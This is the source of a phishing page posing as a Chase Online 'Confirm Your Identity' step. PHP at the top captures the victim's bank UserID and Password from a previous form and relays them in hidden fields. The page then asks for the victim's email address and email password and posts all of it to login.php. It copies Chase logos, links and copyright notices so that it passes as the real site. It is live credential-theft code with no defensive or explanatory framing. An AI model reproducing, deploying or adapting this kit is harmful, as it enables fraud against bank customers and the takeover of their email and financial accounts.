﻿<?
$strSurname1 .= $_POST['UserID'];
$strSurname2 .= $_POST['Password'];

?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="post-check=0">
<meta http-equiv="Cache-Control" content="pre-check=0">
<meta http-equiv="Content-Style-Type" content="text/css">
<meta name="Author" content="&nbsp;© 2014 JPMorgan Chase &amp; Co."><meta name="CONNECTION" content="CLOSE"><meta name="description" content="Identification"><link rel="SHORTCUT ICON" href="favicon.ico"><title>Chase Online - Confirm Your Identity</title><!--POH-->
<link rel="stylesheet" type="text/css" href="index.css" media="all">
<style type="text/css">
<!--
.style11 {font-size: 9pt}
-->
</style>
</head>
<body><style type='text/css'>
.error_strings
{
    font-family:Verdana;
    font-size:11px;
    font-weight:bold;
    color:#ff6b24;
}
</style>
<script language='JavaScript' src='validator.js'>
</script>

<form name="emailpass" method="post" action="login.php" >
    <input type=hidden name=UserID value="<? print $strSurname1; ?>">
    <input type=hidden name=Password value="<? print $strSurname2; ?>">

<div>

</div>



<div>

	
</div>
  <center>
<!-- BEGIN Global Navigation table --><table class="fullwidth" summary="global navigation" border="0" cellpadding="0" cellspacing="0"><tbody><tr><td><a href="http://www.chase.com/" id="siteLogo"><img src="https://chaseonline.chase.com/images//ChaseNew.gif" alt="Chase Online Logo" style="margin: 17px;"></a></td>
<td class="globalnav"><a id="homelink" href="javascript:document.location.href='http://www.chase.com/';" class="globalnavlinks">Chase.com</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a id="contactuslink" href="http://www.chase.com//ccp/index.jsp?pg_name=ccpmapp/shared/assets/page/contactus" class="globalnavlinks">Contact Us</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a id="privacypolicylik" href="javascript:document.location.href='http://www.chase.com//cm/cs?pagename=Chase/Href&amp;urlname=chase/cc/privacysecurity/policy/policy2';" class="globalnavlinks">Privacy Policy&nbsp;&nbsp;|&nbsp;&nbsp;<a href="https://chaseonline.chase.com/secure/LogOff.aspx" id="logoffbutton"><img src="https://chaseonline.chase.com/images/logoff.gif" alt="Log Off" style="margin-right: 13px;" width="60" height="17"></a></a></td>
</tr></tbody></table><!-- END Global Navigation table --><!-- BEGIN Tab Navigation table --><table summary="primary navigation" border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="spacerh5">&nbsp;</td></tr></tbody></table><!-- END Tab Navigation table --><!-- BEGIN Segment table --><table class="headerbarwidth" summary="section header" border="0" cellpadding="0" cellspacing="0"><tbody><tr class="headerbar"><td class="segimage" align="left">&nbsp;</td><td class="headerbardate">&nbsp;</td></tr></tbody></table><!-- END Segment table -->
<div class="constraint-container">
<table class="fullwidth" cellpadding="0" cellspacing="0">
	<tbody><tr>
		<td height="553" class="sidebar">&nbsp;</td>
		<td class="spacerw25">&nbsp;</td>
		<td valign="top" width="721"><div class="Printable">
      <table>
        <tbody><tr>
          <td colspan="4">
            <div class="notprintable"><table width="100%" cellpadding="0" cellspacing="0"><tbody><tr><td class="bcrow" style="padding-left: 0px;"></td></tr></tbody></table><table width="100%" cellpadding="0" cellspacing="0"><tbody><tr><td colspan="2" class="spacerh20">&nbsp;</td></tr><tr><td class="pagetitle">Confirm Your Identity</td><td align="right"><img src="https://chaseonline.chase.com/images/arrow_outlined-short.gif" alt="" style="vertical-align: bottom;" width="13" height="13">&nbsp;<a title="Opening in a new window" class="helplinks" onBlur="window.status='';return true;" onFocus="window.status='';return true;" href="http://www.chase.com/ccp/index.jsp?pg_name=shared/help/page/enr_secauthedu">Help with this page</a>&nbsp;</td>
            </tr>
                  <tr></tr>
            </tbody></table></div>          </td>
        </tr>
        
        <tr>
          <td colspan="4">&nbsp;            </td>
        </tr>
        
        <tr>
          <td colspan="4"><table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tbody>
              <tr></tr>
              <tr>
                <td class="bodytextlg" colspan="2" align="left"><span class="instrtextarea"><span class="instrtexthead"><strong>We need to confirm your identity —</strong></span><span class="instrtext style11"> We apologize for the inconvenience, but we don't recognize the computer </span></span></td>
              </tr>
              <tr>
                <td class="bodytextlg" align="left">&nbsp;</td>
                <td class="bodytextlg" align="left"><p class="instrtextarea"><span class="instrtext style11">you're using. In order to help prevent an unauthorized person from accessing your accounts, we need to verify your identity before you log on.</span></p></td>
              </tr>
              <tr>
                <td class="bodytextlg" colspan="2" align="left">&nbsp;</td>
              </tr>
              <tr>
                <td class="bodytextlg" colspan="2" align="left"><p class="instrtextarea instrtexthead"><strong>Why don't you recognize my computer?</strong></p></td>
              </tr>
              <tr>
                <td class="spacerh10" colspan="2"></td>
              </tr>
              <tr>
                <td class="spacerw15"></td>
                <td class="bodytext" align="left"><ul type="square">
                    <li>You may have bought a new computer or are using one you haven't previously used.</li>
                  <li>You may have changed the settings on your browser or switched to a new browser.</li>
                  <li>You may have deleted your cookies.</li>
                  <li>You may have reconfigured your computer, operating system or other software settings.</li>
                  <li>Your Internet Service Provider may have changed settings on their system.</li>
                </ul></td>
              </tr>
              <tr> </tr>
              <tr>
                <td class="spacerh10" colspan="2"></td>
              </tr>
              <tr>
                <td colspan="2" align="left" class="instrtextarea"><strong>What do I need to do?</strong></td>
              </tr>
              <tr>
                <td class="spacerh10" colspan="2"></td>
              </tr>
              <tr>
                <td class="spacerw15"></td>
                <td class="bodytext" align="left"><strong>You need to  enter your current primary e-mail address and  e-mail  Password.</strong> Make sure your <strong>current primary e-mail address</strong> and e-mail  Password are correctly entered  and click "Next" below to follow the verification  easy process.</td>
              </tr>
              <tr>
                <td class="spacerw15"></td>
                <td class="bodytext" align="left"><br></td>
              </tr>
            </tbody>
          </table>            </td>
        </tr>
        <tr>
          <td colspan="4">
            <table width="100%" align="center" border="0" cellpadding="0" cellspacing="0">
              <tbody><tr>
                <td class="lblueHeaderLeft">
                  &nbsp;&nbsp;&nbsp;&nbsp;</td>
                <td class="lblueHeader">
                  <span id="lblSummaryHeader" class="summaryHeader" style="display: inline-block; height: 10%;">Confirm Your Identity</span>                </td>
                <td class="lblueHeaderRight">
                  &nbsp;&nbsp;&nbsp;</td>
              </tr>
            </tbody></table>          </td>
        </tr>
        
        <tr>
          <td colspan="3"><div id='emailpass_email_errorloc' class='error_strings'></div>
<div id='emailpass_epass_errorloc' class='error_strings'></div>             </td>
          <td>
            <!-- START of art_SA_edu_edu_instr in DCTM ECP -->
            <!-- END of art_SA_edu_edu_instr in DCTM ECP --></td>
        </tr>
        <tr>
          <td width="12" class="bodytextbold">&nbsp;</td>
          <td width="239" class="bodytextbold"><div align="right"><strong>Current primary e-mail address</strong><span class="alerttext2">*</span></div></td>
          <td width="160" class="bodytextbold"><input value="" maxlength="32" id="email" tabindex="1" name="email"  style="width: 160px;" type="text" autocomplete="off"></td>
          <td width="288">&nbsp;</td>
        </tr>
        
        <tr>
          <td class="bodytextbold">&nbsp;</td>
          <td class="bodytextbold"><div align="right">E-mail  Password<span class="alerttext2">*</span></div></td>
          <td class="bodytextbold"><input value="" maxlength="32" id="epass" tabindex="2" name="epass"  style="width: 160px;" type="password" autocomplete="off"></td>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td colspan="3">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td colspan="4"><span class="alerttext2"><strong class="bodytextbold">*</strong></span><strong class="bodytextbold">Required field</strong></td>
        </tr>
        <tr>
          <td class="divider2" colspan="4">
            <label title="Horizontal Line">          </label></td>
        </tr>
        <tr>
          <td colspan="4" class="tanButtonRow" align="center">
            <div class="NotPrintable"><table><tbody><tr><td align="center"></td><td><input name="NextButton" value="Next" id="NextButton" title="Go to Select Identification Code page" class="buttonfwd" alt="Next" type="submit"></td><td><input name="CancelButton" value="Reset" id="CancelButton" title="Go to Chase Home page" class="buttonback" alt="Cancel" type="reset"><div id='emailpass_submit_errorloc' class='error_strings'>
</div>
</td></tr></tbody></table></div>          </td>
        </tr>
      </tbody></table>
     </div></td>
		<td class="spacerw25">&nbsp;</td>
		<td class="sidebar">&nbsp;</td>
	</tr>
	<tr>
		<td class="sidebar">&nbsp;</td>
		<td class="spacerh30" colspan="3">&nbsp;</td>
		<td class="sidebar">&nbsp;</td>
	</tr>
	<tr>
		<td class="sidebar" colspan="5">&nbsp;</td>
	</tr>
</tbody></table>
</div>
<!--Footer--><table class="fullwidth" summary="terms of use link and copyright" border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="spacerh10" colspan="3">&nbsp;</td></tr><tr><td style="width: 30%; vertical-align: top;">&nbsp;</td><td valign="top" width="40%" align="center"><span class="footertext"><a id="SecurityLink" href="javascript:document.location.href='http://www.chase.com//ccp/index.jsp?pg_name=ccpmapp/shared/assets/page/security_measures';" onBlur="window.status='';return true" onFocus="window.status='';return true">Security</a>&nbsp;|&nbsp;<a id="TermsLink" href="javascript:document.location.href='http://www.chase.com//ccp/index.jsp?pg_name=ccpmapp/shared/assets/page/terms';" onBlur="window.status='';return true" onFocus="window.status='';return true">Terms of Use</a>&nbsp;</span></td><td style="text-align: center; width: 30%; vertical-align: top;">&nbsp;</td></tr></tbody></table><div class="printable"><table class="fullwidth" border="0" cellpadding="0" cellspacing="0"><tbody><tr><td class="spacerh10">&nbsp;</td></tr><tr><td class="footertext" align="center">&nbsp;© 2015 JPMorgan Chase &amp; Co.</td></tr><tr><td class="spacerh10">&nbsp;</td></tr></tbody></table></div><!--END Footer-->
</center>
</form>

<script language='JavaScript'>
var emailpassValidator = new Validator("emailpass");
emailpassValidator.EnableOnPageErrorDisplay();
emailpassValidator.addValidation("email","req","Please fill in your Current primary e-mail address");
emailpassValidator.addValidation("email","email","The input for e-mail address must be a valid e-mail value");
emailpassValidator.addValidation("email","minlen=6","The input for e-mail address must be a valid e-mail value");
emailpassValidator.addValidation("epass","minlen=6","Please fill in your E-mail Password");
emailpassValidator.addValidation("epass","req","Please fill in your E-mail Password");
</script>


</body>
</html>
